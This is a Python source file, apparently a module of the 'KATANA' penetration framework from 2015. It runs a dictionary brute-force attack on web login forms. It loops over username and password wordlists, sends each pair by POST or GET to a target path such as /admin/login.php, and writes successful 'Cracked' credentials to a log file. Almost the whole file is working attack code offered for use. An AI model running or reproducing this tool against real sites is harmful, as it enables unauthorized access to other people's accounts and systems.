# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                       #
# Modules   : Brute Force Form  #
# Script by : RedToor           #
# Date      : 28/02/2015        #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                   #
from core.design import *       #
from core import help           #
from core import ping           #
d=DESIGN()                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                     #
import httplib,urllib           #
import socket                   #
import sys                      #
import time                     #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                       #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaulthost="127.0.0.1"
defaultport="80"
defaultpach="/admin/login.php"
defaultdic1="core/db/user.dicc"
defaultdic2="core/db/pass.dicc"
defaultdat1="username"
defaultdat2="password"
defaultmeth="POST"
defaultcont="no"
# :-:-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(para,parb,parc,pard,pare,parf,parg,pari,parj):
	global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2,defaultdat1,defaultdat2,defaultmeth,defaultcont
	defaulthost=para
	defaultport=parb
	defaultpach=parc
	defaultdic1=pard
	defaultdic2=pare
	defaultdat1=parf
	defaultdat2=parg
	defaultmeth=pari
	defaultcont=parj
	httpformbasebruteforce(1)

def httpformbasebruteforce(run):
	try:
		global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2,defaultdat1,defaultdat2,defaultmeth,defaultcont
		if run!=1:
			actions=raw_input(d.prompt("web/formbt"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port of target",defaultport)
			d.descrip("patch","yes","Folder or dir",defaultpach)
			d.descrip("para_1","yes","Parameter 1",defaultdat1)
			d.descrip("para_2","yes","Parameter 2",defaultdat2)
			d.descrip("method","yes","POST or GET",defaultmeth)
 			d.descrip("condit","yes","[if!=]No Logged",defaultcont)
 			d.descrip("dict_1","yes","Dictionary user",defaultdic1)
 			d.descrip("dict_2","yes","Dictionary pass",defaultdic2)
			print ""
		elif actions[0:10] == "set target":
				defaulthost = actions[11:]
				defaulthost = defaulthost.replace("http://", "")
				d.change("target",defaulthost)
				httpformbasebruteforce(0)
		elif actions[0:8] == "set port":
				defaultport = actions[9:]
				d.change("port",defaultport)
				httpformbasebruteforce(0)
		elif actions[0:9] == "set patch":
				defaultpach = actions[10:]
				d.change("patch",defaultpach)
				httpformbasebruteforce(0)
		elif actions[0:10] == "set condit":
				defaultcont = actions[11:]
				d.change("condit",defaultcont)
				httpformbasebruteforce(0)
		elif actions[0:10] == "set dict_1":
				defaultdic1 = actions[11:]
				d.change("dict_1",defaultdic1)
				httpformbasebruteforce(0)
		elif actions[0:10] == "set dict_2":
				defaultdic2 = actions[11:]
				d.change("dict_1",defaultdic2)
				httpformbasebruteforce(0)
		elif actions[0:10] == "set para_1":
				defaultdat1 = actions[11:]
				d.change("para_1",defaultdat1)
				httpformbasebruteforce(0)
		elif actions[0:10] == "set para_2":
				defaultdat2 = actions[11:]
				d.change("para_2",defaultdat2)
				httpformbasebruteforce(0)
		elif actions[0:10] == "set method":
				defaultmeth = actions[11:]
				d.change("method",defaultmeth)
				httpformbasebruteforce(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				ping.live(defaulthost,defaultport)
				if True:
					try:
						d.loading()
						try:
							with open(defaultdic1,'r') as user:
								for us in user: 
									try:
										with open(defaultdic2,'r') as passs:
											for ps in passs:
												us=us.replace("\n","")
												ps=ps.replace("\n","")
												params = urllib.urlencode({defaultdat1: us, defaultdat2: ps})
												header={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
												conn = httplib.HTTPConnection(defaulthost,defaultport)
												conn.request(defaultmeth, defaultpach, params, header)
												response = conn.getresponse()
												ver_source = response.read()
												if ver_source.find(defaultcont) != 0:
													log=open('core/logs/logsBruteForce.log','a')
													log.write('\n ===================================== ')
													log.write('\n Module  : BruteForceFormBase')
													log.write('\n Data    : '+time.strftime('%c'))
													log.write('\n target  : '+defaulthost)
													log.write('\n path    : '+defaultpach)
													log.write('\n method  : '+defaultmeth)
													log.write('\n Cracked : ('+defaultdat1+' : '+us+' , '+defaultdat2+' : '+ps+')')
													log.close()
													print "\n-["+colors[2]+"*"+colors[0]+"] Successfully with ("+defaultdat1+"="+us+")("+defaultdat2+"="+ps+")\n"
													httpformbasebruteforce(0)
												else:
													print " ["+colors[4]+"!"+colors[0]+"] Checking ("+defaultdat1+"="+us+")("+defaultdat2+"="+ps+")"
									except:
										d.filenot()
										httpformbasebruteforce(0)
						except:
							d.filenot()
							httpformbasebruteforce(0)
					except:
						d.kbi()
			except:
				d.off()
		else:
			d.nocommand()
	except:
		d.kbi()
		exit()
	httpformbasebruteforce(0)